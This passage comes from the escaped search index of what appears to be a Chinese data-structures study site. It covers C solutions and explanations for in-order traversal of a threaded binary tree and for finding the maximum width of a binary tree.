C<pre><code>// t\u662f\u6307\u5411\u4e2d\u5e8f\u5168\u7ebf\u7d22\u5316\u5934\u7ed3\u70b9\u7684\u6307\u9488\uff0c\u8be5\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e2d\u5e8f\u904d\u5386\nvoid InOrderThreat(BiThrTree t) {\n    BiThrTree p = t-&gt;lchild; // p\u6307\u5411\u4e8c\u53c9\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u5982\u679c\u4e8c\u53c9\u6811\u4e3a\u7a7a\uff0c\u5219\u6307\u5411t\u3002\n\n    while (p != t) { // \u901a\u8fc7while\u5faa\u73af\u904d\u5386\u6574\u68f5\u6811\uff0c\u76f4\u5230\u56de\u5230\u5934\u7ed3\u70b9\u3002\n        // \u627e\u5230\u4e2d\u5e8f\u904d\u5386\u7684\u8d77\u59cb\u7ed3\u70b9\uff08\u6700\u5de6\u4e0b\u7ed3\u70b9\uff09\n        while (p-&gt;LTag == Link) {\n            p = p-&gt;lchild;\n        }\n\n        // \u8bbf\u95ee\u5f53\u524d\u7ed3\u70b9\n        visit(p);\n\n        // \u5982\u679c\u5f53\u524d\u7ed3\u70b9\u7684\u53f3\u5b50\u6811\u662f\u7ebf\u7d22\uff0c\u5219\u6cbf\u7740\u7ebf\u7d22\u7ee7\u7eed\u904d\u5386\n        while (p-&gt;RTag == Thread &amp;&amp; p-&gt;rchild != t) {\n            p = p-&gt;rchild;\n            visit(p);\n        }\n\n        // \u8f6c\u5411\u53f3\u5b50\u6811\n        p = p-&gt;rchild;\n    }\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u5b9e\u73b0\u4e86\u5bf9\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u7684\u904d\u5386\uff0c\u5177\u4f53\u7684\u601d\u8def\u548c\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <ol> <li> <p>\u9996\u5148\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570 <code>InOrderThreat</code>\uff0c\u63a5\u53d7\u4e00\u4e2a\u6307\u5411\u4e2d\u5e8f\u5168\u7ebf\u7d22\u5316\u5934\u7ed3\u70b9\u7684\u6307\u9488 <code>t</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5934\u7ed3\u70b9\u4e2d\u7684 <code>lchild</code> \u6307\u5411\u6811\u7684\u6839\u8282\u70b9\uff0c<code>rchild</code> \u6307\u5411\u4e2d\u5e8f\u904d\u5386\u7684\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff0c<code>LTag</code> \u548c <code>RTag</code> \u5206\u522b\u8868\u793a\u5de6\u53f3\u5b69\u5b50\u7684\u7c7b\u578b\uff08\u662f\u7ebf\u7d22\u8fd8\u662f\u6307\u9488\uff09\u3002</p> </li> <li> <p>\u5728\u51fd\u6570\u5185\u90e8\uff0c\u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6307\u9488 <code>p</code> \u6307\u5411\u6839\u7ed3\u70b9\uff0c\u5982\u679c\u6811\u4e3a\u7a7a\uff0c\u5219 <code>p</code> \u6307\u5411\u5934\u7ed3\u70b9 <code>t</code>\u3002</p> </li> <li> <p>\u901a\u8fc7\u4e00\u4e2a <code>while</code> \u5faa\u73af\u6765\u904d\u5386\u6574\u68f5\u6811\uff0c\u5faa\u73af\u7684\u7ec8\u6b62\u6761\u4ef6\u662f\u5f53 <code>p</code> \u56de\u5230\u5934\u7ed3\u70b9 <code>t</code> \u65f6\u3002</p> </li> <li> <p>\u5185\u90e8\u7684\u7b2c\u4e00\u4e2a <code>while</code> \u5faa\u73af\u7528\u4e8e\u627e\u5230\u4e2d\u5e8f\u904d\u5386\u7684\u8d77\u59cb\u7ed3\u70b9\uff0c\u5373\u6700\u5de6\u4e0b\u7684\u7ed3\u70b9\u3002\u8fd9\u662f\u901a\u8fc7\u4e0d\u65ad\u5411\u5de6\u5b50\u6811\u904d\u5386\u5b9e\u73b0\u7684\uff0c\u76f4\u5230 <code>p</code> \u7684 <code>LTag</code> \u53d8\u4e3a <code>Thread</code> \u4e3a\u6b62\uff0c\u8bf4\u660e\u5df2\u7ecf\u5230\u8fbe\u4e86\u6700\u5de6\u4e0b\u7684\u7ed3\u70b9\u3002</p> </li> <li> <p>\u8bbf\u95ee\u5f53\u524d\u7ed3\u70b9 <code>p</code>\uff0c\u8fd9\u91cc\u5047\u8bbe\u6709\u4e00\u4e2a\u51fd\u6570 <code>visit</code>\uff0c\u7528\u4e8e\u5904\u7406\u904d\u5386\u5230\u7684\u7ed3\u70b9\u3002</p> </li> <li> <p>\u63a5\u4e0b\u6765\uff0c\u5982\u679c\u5f53\u524d\u7ed3\u70b9\u7684\u53f3\u5b50\u6811\u662f\u7ebf\u7d22\uff08\u5373 <code>RTag</code> \u4e3a <code>Thread</code>\uff09\uff0c\u5219\u901a\u8fc7\u6cbf\u7740\u53f3\u5b69\u5b50\u7684\u7ebf\u7d22\u7ee7\u7eed\u904d\u5386\u3002\u8fd9\u662f\u901a\u8fc7\u4e00\u4e2a\u5185\u90e8\u7684 <code>while</code> \u5faa\u73af\u6765\u5b9e\u73b0\u7684\uff0c\u76f4\u5230 <code>p</code> \u7684\u53f3\u5b69\u5b50\u4e0d\u662f\u7ebf\u7d22\u6216\u8005\u6307\u5411\u5934\u7ed3\u70b9 <code>t</code> \u4e3a\u6b62\u3002</p> </li> <li> <p>\u6700\u540e\uff0c\u5c06\u6307\u9488 <code>p</code> \u8f6c\u5411\u5f53\u524d\u7ed3\u70b9\u7684\u53f3\u5b50\u6811\uff0c\u7ee7\u7eed\u904d\u5386\u3002\u5982\u679c\u53f3\u5b50\u6811\u662f\u7ebf\u7d22\uff0c\u5219\u4f1a\u76f4\u63a5\u8df3\u5230\u4e0b\u4e00\u4e2a\u4e2d\u5e8f\u904d\u5386\u7684\u7ed3\u70b9\uff1b\u5982\u679c\u53f3\u5b50\u6811\u662f\u6307\u9488\uff0c\u5219\u4f1a\u6cbf\u7740\u6307\u9488\u5411\u53f3\u79fb\u52a8\u3002</p> </li> </ol> <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u6bb5\u4ee3\u7801\u901a\u8fc7\u5229\u7528\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u7684\u7ebf\u7d22\u4fe1\u606f\uff0c\u5b9e\u73b0\u4e86\u4e2d\u5e8f\u904d\u5386\u3002\u901a\u8fc7 <code>LTag</code> \u548c <code>RTag</code> \u6807\u8bb0\u5de6\u53f3\u5b69\u5b50\u7684\u7c7b\u578b\uff0c\u53ef\u4ee5\u65b9\u4fbf\u5730\u786e\u5b9a\u904d\u5386\u7684\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_25","title":"\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u7684\u904d\u5386\u7b97\u6cd5\uff08\u6709\u5934\u8282\u70b9\uff09","text":"<p>\u2460 \u7ed3\u675f\u7684\u6761\u4ef6\uff1f</p> <p>\u200b \u6811\u7a7a\u6216\u8005\u6307\u9488\u6307\u5411\u5934\u7ed3\u70b9</p> <p>\u2461 \u4e2d\u5e8f\u904d\u5386\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\uff1f</p> <p>\u200b \u5de6\u5b50\u6811\u4e0a\u5904\u4e8e\u201c\u6700\u5de6\u4e0b\u201d\uff08\u6ca1\u6709\u5de6\u5b50\u6811\uff09\u7684\u7ed3\u70b9</p> <p>\u2462 \u5728\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e2d\u7ed3\u70b9\u7684\u540e\u7ee7\uff1f**</p> <p>\u200b \u82e5\u65e0\u53f3\u5b50\u6811\uff0c\u5219\u53f3\u7ebf\u7d22\u6240\u6307\u7ed3\u70b9\u4e3a\u540e\u7ee7\u3002\u5426\u5219\uff0c\u53f3\u5b50\u6811\u7684\u201c\u6700\u5de6\u4e0b\u201d\u5b69\u5b50\u4e3a\u540e\u7ee7\uff1b</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_26","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>//t\u662f\u6307\u5411\u4e2d\u5e8f\u5168\u7ebf\u7d22\u5316\u5934\u7ed3\u70b9\u7684\u6307\u9488\uff0c\u8be5\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e2d\u5e8f\u904d\u5386\nvoid InOrderThreat(BiThrTree t)\n{\n    BiThrTree p = t-&gt;lchild;  //p\u6307\u5411\u4e8c\u53c9\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u5f53\u4e8c\u53c9\u6811\u4e3a\u7a7a\u65f6\uff0cp\u6307\u5411t\n    //\u8bf7\u5728\u6b64\u5b8c\u6210\u4ee3\u7801\n    while (p != t)\n    {\n        while (p-&gt;LTag == Link)\n            p = p-&gt;lchild;//\u6cbf\u5de6\u5b50\u5973\u5411\u4e0b\n        visit(p);//\u8bbf\u95ee\u5de6\u5b50\u6811\u4e3a\u7a7a\u7684\u7ed3\u70b9\n        while (p-&gt;RTag == Thread &amp;&amp; p-&gt;rchild != t) {\n            p = p-&gt;rchild;\n            visit(p);\n        }//\u6cbf\u53f3\u7ebf\u7d22\u8bbf\u95ee\u540e\u7ee7\u7ed3\u70b9\n        p = p-&gt;rchild;//\u8f6c\u5411\u53f3\u5b50\u6811\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_27","title":"\u6c42\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u8ba1\u7b97\u4e00\u68f5\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u7684\u529f\u80fd\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u91c7\u7528\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\uff0c\u5176\u4e2d\u7528\u2019#'\u8868\u793a\u7a7a\u7ed3\u70b9\u3002\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u662f\u6307\u4e8c\u53c9\u6811\u6240\u6709\u5c42\u4e2d\u7ed3\u70b9\u4e2a\u6570\u7684\u6700\u5927\u503c\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_28","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aa##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u662f\uff1a1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_29","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#define MAX 100 //\u5b9a\u4e49\u961f\u5217\u7684\u6700\u5927\u5bb9\u91cf\n\ntypedef struct BiTNode {\n    //\u5b9a\u4e49\u7ed3\u6784\u4f53\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Account_Width(Bitree T) {\n    //\u6c42\u4e8c\u53c9\u6811\u6700\u5927\u5bbd\u5ea6\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    printf(\"\\n\");\n    printf(\"\u8be5\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u662f\uff1a%d\", Account_Width(T));\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_30","title":"\u7b54\u6848","text":"<p>\u7528\u5230\u4e86\u4e24\u4e2a\u8f85\u52a9\u51fd\u6570\uff0c\u4e00\u4e2a\u6c42\u9ad8\u5ea6<code>GetHeight()</code>\uff0c\u4e00\u4e2a\u6c42\u6307\u5b9a\u5c42\u7ea7\u7684\u5bbd\u5ea6<code>GetWidth()</code>\uff0c\u5176\u4e2d<code>GetHeight()</code>\u5c31\u662f\u4e0a\u9762\u9898\u76ee\u201c\u6c42\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\u201d\u3002</p> <p>\u591a\u7406\u89e3\u7406\u89e3<code>GetWidth()</code>\uff0c\u4e5f\u633a\u6709\u610f\u601d\u7684\u3002</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    char ch;\n    scanf(\"%c\", &amp;ch);\n    if (ch == '#') {\n        *T = NULL;\n    }\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild);\n        Creat_Bitree(&amp;(*T)-&gt;rchild);\n    }\n}\n\nint GetHeight(Bitree T) {\n    //\u6c42\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\n    if (T == NULL) {\n        return 0;\n    }\n    int left_height = GetHeight(T-&gt;lchild);\n    int right_height = GetHeight(T-&gt;rchild);\n    return left_height &gt; right_height ? (left_height + 1) : (right_height + 1);\n}\n\nint GetWidth(Bitree T, int level, int* count) {\n    //\u6c42\u4e8c\u53c9\u6811\u5728\u6307\u5b9a\u5c42\u7ea7\u7684\u5bbd\u5ea6\n    if (T == NULL) {\n        return 0;\n    }\n    if (level == 1) { // \u51fd\u6570\u5224\u65ad\u5f53\u524d\u5c42\u7ea7\u662f\u5426\u4e3a\u76ee\u6807\u5c42\u7ea7\uff0c\u5373level\u662f\u5426\u4e3a1\u3002\n        // \u5982\u679c\u662f\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u4e3a\u76ee\u6807\u5c42\u7ea7\u7684\u8282\u70b9\uff0c\u5c06\u8ba1\u6570\u5668count\u7684\u503c\u52a01\uff0c\u8868\u793a\u627e\u5230\u4e86\u4e00\u4e2a\u5bbd\u5ea6\u3002\n        (*count)++;\n    }\n    else if (level &gt; 1) {\n        // \u5982\u679c\u5f53\u524d\u5c42\u7ea7\u5927\u4e8e1\uff0c\u8868\u793a\u76ee\u6807\u5c42\u7ea7\u5c1a\u672a\u5230\u8fbe\uff0c\u9700\u8981\u7ee7\u7eed\u5411\u4e0b\u9012\u5f52\u3002\n        // \u51fd\u6570\u901a\u8fc7\u9012\u5f52\u8c03\u7528\u81ea\u8eab\uff0c\u5206\u522b\u4f20\u5165\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\uff0c\u540c\u65f6\u5c06\u76ee\u6807\u5c42\u7ea7\u51cf1\uff0c\u5e76\u4f20\u5165\u8ba1\u6570\u5668\u7684\u6307\u9488\u3002\n        // \u8fd9\u6837\uff0c\u9012\u5f52\u8c03\u7528\u4f1a\u5728\u4e0b\u4e00\u5c42\u7ea7\u7ee7\u7eed\u5224\u65ad\u662f\u5426\u4e3a\u76ee\u6807\u5c42\u7ea7\uff0c\u76f4\u5230\u627e\u5230\u76ee\u6807\u5c42\u7ea7\u4e3a\u6b62\u3002\n        GetWidth(T-&gt;lchild, level - 1, count);\n        GetWidth(T-&gt;rchild, level - 1, count);\n    }\n}\n\nint Account_Width(Bitree T) {\n    //\u6c42\u4e8c\u53c9\u6811\u6700\u5927\u5bbd\u5ea6\n    int max_width = 0;\n    int count;\n    int height = GetHeight(T); // \u83b7\u53d6\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\n\n    for (int level = 1; level &lt;= height; level++) {\n        count = 0;\n        GetWidth(T, level, &amp;count);\n        if (count &gt; max_width) {\n            max_width = count;\n        }\n    }\n\n    return max_width;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_31","title":"\u6807\u51c6\u7b54\u6848\uff08\u5f85\u5b8c\u6210\uff09","text":"<p>\u6807\u51c6\u7b54\u6848\u7528\u7684\u662f\u961f\u5217\uff0c\u548c\u54b1\u4e0a\u9762\u90a3\u4e2a\u601d\u8def\u5b8c\u5168\u4e0d\u540c\u3002\uff08\u611f\u89c9\u6ca1\u54b1\u7684\u597d\u7406\u89e3\uff09</p> <p>\u5176\u5b9e\u539f\u672c\u5df2\u6709\u7684\u4ee3\u7801\u5c31\u5df2\u7ecf\u8bf4\u4e86\u7528\u961f\u5217\u3002</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL; //\u7a7a\u6811\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode)); //\u521b\u5efa\u7ed3\u70b9\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild); // \u5de6\u5b50\u6811\n        Creat_Bitree(&amp;(*T)-&gt;rchild); // \u53f3\u5b50\u6811\n    }\n}\n\nint Account_Width(Bitree T) {\n    if (T == NULL) {\n        return 0;\n    }\n    else {\n        Bitree Q[MAX]; // \u521b\u5efa\u961f\u5217Q\uff0c\u5b58\u653e\u4e8c\u53c9\u6811\u6307\u9488\n\n        int front = 1, rear = 1, right_node = 1; // right_node\u8868\u793a\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u5728\u961f\u5217\u4e2d\u7684\u4f4d\u7f6e\n        int width_min = 0, width_max = 0; // width_min\u8bb0\u5f55\u5f53\u524d\u5c42\u5bbd\u5ea6\uff0cwidth_max\u8bb0\u5f55\u6700\u5927\u5bbd\u5ea6\n\n        Q[rear] = T; // \u6839\u8282\u70b9\u5165\u961f\n        while (front &lt;= right_node) { // \u961f\u5217\u4e0d\u4e3a\u7a7a\n            Bitree p = Q[front++]; // \u51fa\u961f\n            width_min++; // \u5f53\u524d\u5c42\u5bbd\u5ea6\u52a01\n\n            if (p-&gt;lchild != NULL) {\n                Q[++rear] = p-&gt;lchild; // \u5de6\u5b69\u5b50\u5165\u961f\n            } \n            if (p-&gt;rchild != NULL) {\n                Q[++rear] = p-&gt;rchild; // \u53f3\u5b69\u5b50\u5165\u961f\n            }\n\n            if (front &gt; right_node) { // \u5f53\u524d\u5c42\u904d\u5386\u5b8c\u6bd5\n                right_node = rear; // \u66f4\u65b0\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\n                if (width_min &gt; width_max) {\n                    width_max = width_min; // \u66f4\u65b0\u6700\u5927\u5bbd\u5ea6\n                }\n                width_min = 0; // \u91cd\u7f6e\u5f53\u524d\u5c42\u5bbd\u5ea6\n            }\n        }\n\n        return width_max; // \u8fd4\u56de\u6700\u5927\u5bbd\u5ea6\n    }\n}\n</code></pre> <p><code>Account_Width</code>\u51fd\u6570\u4f7f\u7528\u5c42\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u3002\u4e0b\u9762\u662f\u51fd\u6570\u7b97\u6cd5\u7684\u8be6\u7ec6\u89e3\u91ca\uff1a</p> <ol> <li> <p>\u9996\u5148\uff0c\u51fd\u6570\u68c0\u67e5\u8f93\u5165\u7684\u4e8c\u53c9\u6811\u6307\u9488<code>T</code>\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u76f4\u63a5\u8fd4\u56de0\uff0c\u8868\u793a\u6811\u7684\u5bbd\u5ea6\u4e3a0\u3002</p> </li> <li> <p>\u63a5\u4e0b\u6765\uff0c\u51fd\u6570\u5b9a\u4e49\u4e00\u4e2a\u961f\u5217<code>Q</code>\uff0c\u7528\u6765\u5b58\u653e\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u6307\u9488\u3002\u961f\u5217\u7684\u5927\u5c0f\u7531\u5b8f\u5b9a\u4e49<code>MAX</code>\u51b3\u5b9a\u3002</p> </li> <li> <p>\u51fd\u6570\u58f0\u660e\u4e00\u4e9b\u53d8\u91cf\uff0c\u5305\u62ec\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e<code>front</code>\u3001\u540e\u7aef\u4f4d\u7f6e<code>rear</code>\u548c\u5f53\u524d\u5c42\u7684\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e<code>right_node</code>\u3002\u521d\u59cb\u65f6\uff0c\u8fd9\u4e9b\u53d8\u91cf\u90fd\u8bbe\u7f6e\u4e3a1\uff0c\u8868\u793a\u961f\u5217\u4e2d\u53ea\u6709\u6839\u8282\u70b9\u3002</p> </li> <li> <p>\u5b9a\u4e49\u4e24\u4e2a\u53d8\u91cf<code>width_now</code>\u548c<code>width_max</code>\uff0c\u5206\u522b\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d\u5c42\u7684\u5bbd\u5ea6\u548c\u6700\u5927\u5bbd\u5ea6\u3002\u521d\u59cb\u65f6\uff0c\u5b83\u4eec\u90fd\u8bbe\u7f6e\u4e3a0\u3002</p> </li> <li> <p>\u5c06\u4e8c\u53c9\u6811\u7684\u6839\u8282\u70b9\u6307\u9488<code>T</code>\u5165\u961f\u3002</p> </li> <li> <p>\u8fdb\u5165\u4e00\u4e2a\u5faa\u73af\uff0c\u5faa\u73af\u6761\u4ef6\u662f\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e\u5c0f\u4e8e\u7b49\u4e8e\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\u3002\u8fd9\u610f\u5473\u7740\u961f\u5217\u4e2d\u8fd8\u6709\u7ed3\u70b9\u9700\u8981\u5904\u7406\u3002</p> </li> <li> <p>\u5728\u5faa\u73af\u4e2d\uff0c\u9996\u5148\u51fa\u961f\u4e00\u4e2a\u7ed3\u70b9<code>p</code>\uff0c\u8868\u793a\u5f53\u524d\u5c42\u7684\u4e00\u4e2a\u7ed3\u70b9\u3002</p> </li> <li> <p>\u5c06\u5f53\u524d\u5c42\u5bbd\u5ea6<code>width_now</code>\u52a01\uff0c\u8868\u793a\u5f53\u524d\u5c42\u7684\u5bbd\u5ea6\u589e\u52a0\u4e86\u4e00\u4e2a\u7ed3\u70b9\u3002</p> </li> <li> <p>\u68c0\u67e5\u7ed3\u70b9<code>p</code>\u7684\u5de6\u5b69\u5b50\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u5c06\u5de6\u5b69\u5b50\u5165\u961f\u3002</p> </li> <li> <p>\u68c0\u67e5\u7ed3\u70b9<code>p</code>\u7684\u53f3\u5b69\u5b50\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u5c06\u53f3\u5b69\u5b50\u5165\u961f\u3002</p> </li> <li> <p>\u5982\u679c\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e\u5df2\u7ecf\u8d85\u8fc7\u4e86\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\uff0c\u8bf4\u660e\u5f53\u524d\u5c42\u904d\u5386\u5b8c\u6bd5\u3002</p> </li> <li> <p>\u66f4\u65b0\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e<code>right_node</code>\u4e3a\u961f\u5217\u7684\u540e\u7aef\u4f4d\u7f6e<code>rear</code>\uff0c\u8868\u793a\u4e0b\u4e00\u5c42\u7684\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\u3002</p> </li> <li> <p>\u68c0\u67e5\u5f53\u524d\u5c42\u7684\u5bbd\u5ea6<code>width_now</code>\u662f\u5426\u5927\u4e8e\u6700\u5927\u5bbd\u5ea6<code>width_max</code>\uff0c\u5982\u679c\u662f\uff0c\u5219\u66f4\u65b0\u6700\u5927\u5bbd\u5ea6\u4e3a\u5f53\u524d\u5c42\u5bbd\u5ea6\u3002</p> </li> <li> <p>\u91cd\u7f6e\u5f53\u524d\u5c42\u5bbd\u5ea6<code>width_now</code>\u4e3a0\uff0c\u51c6\u5907\u7edf\u8ba1\u4e0b\u4e00\u5c42\u7684\u5bbd\u5ea6\u3002</p> </li> <li> <p>\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u8fd4\u56de\u6700\u5927\u5bbd\u5ea6<code>width_max</code>\u4f5c\u4e3a\u51fd\u6570\u7684\u7ed3\u679c\u3002</p> </li> </ol> <p>\u603b\u7ed3\u8d77\u6765\uff0c<code>Account_Width</code>\u51fd\u6570\u901a\u8fc7\u5c42\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\u7684\u65b9\u5f0f\uff0c\u4f7f\u7528\u961f\u5217\u6765\u8f85\u52a9\u904d\u5386\u8fc7\u7a0b\uff0c\u7edf\u8ba1\u6bcf\u4e00\u5c42\u7684\u5bbd\u5ea6\u5e76\u8bb0\u5f55\u6700\u5927\u5bbd\u5ea6\uff0c\u6700\u7ec8\u8fd4\u56de\u4e8c\u53c9\u6811\u7684\u6700\u5927\u5bbd\u5ea6\u3002</p> <p>\u4e3a\u4ec0\u4e48\u5982\u679c\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e\u5df2\u7ecf\u8d85\u8fc7\u4e86\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\uff0c\u8bf4\u660e\u5f53\u524d\u5c42\u904d\u5386\u5b8c\u6bd5\uff1f</p> <p>\u5728\u8fd9\u4e2a\u7b97\u6cd5\u4e2d\uff0c\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e<code>front</code>\u548c\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e<code>right_node</code>\u662f\u76f8\u5173\u7684\u3002</p> <p>\u5f53\u6211\u4eec\u8fdb\u884c\u5c42\u5e8f\u904d\u5386\u65f6\uff0c\u6bcf\u6b21\u4ece\u961f\u5217\u4e2d\u53d6\u51fa\u4e00\u4e2a\u7ed3\u70b9\u8fdb\u884c\u5904\u7406\uff0c\u7136\u540e\u5c06\u5176\u5de6\u53f3\u5b69\u5b50\uff08\u5982\u679c\u5b58\u5728\uff09\u5165\u961f\u3002</p> <p>\u5728\u4e00\u6b21\u5c42\u5e8f\u904d\u5386\u4e2d\uff0c\u961f\u5217\u4e2d\u7684\u7ed3\u70b9\u90fd\u662f\u540c\u4e00\u5c42\u7684\u7ed3\u70b9\u3002\u56e0\u6b64\uff0c\u5f53\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e<code>front</code>\u8d85\u8fc7\u4e86\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e<code>right_node</code>\u65f6\uff0c\u8868\u793a\u5f53\u524d\u5c42\u7684\u6240\u6709\u7ed3\u70b9\u90fd\u5df2\u7ecf\u51fa\u961f\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u5c42\u7684\u904d\u5386\u5df2\u7ecf\u5b8c\u6210\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u5728\u5c42\u5e8f\u904d\u5386\u4e2d\uff0c\u6211\u4eec\u662f\u6309\u7167\u4ece\u5de6\u5230\u53f3\u7684\u987a\u5e8f\u5c06\u7ed3\u70b9\u5165\u961f\u7684\uff0c\u800c\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5de6\u5b69\u5b50\u548c\u53f3\u5b69\u5b50\u4f1a\u5728\u540e\u7eed\u7684\u64cd\u4f5c\u4e2d\u88ab\u52a0\u5165\u961f\u5217\u3002\u56e0\u6b64\uff0c\u5f53\u961f\u5217\u7684\u524d\u7aef\u4f4d\u7f6e\u8d85\u8fc7\u4e86\u5f53\u524d\u5c42\u6700\u53f3\u7ed3\u70b9\u4f4d\u7f6e\u65f6\uff0c\u8bf4\u660e\u5f53\u524d\u5c42\u7684\u6240\u6709\u7ed3\u70b9\u90fd\u5df2\u7ecf\u51fa\u961f\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u5f53\u524d\u5c42\u7684\u904d\u5386\u5df2\u7ecf\u5b8c\u6210\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_32","title":"\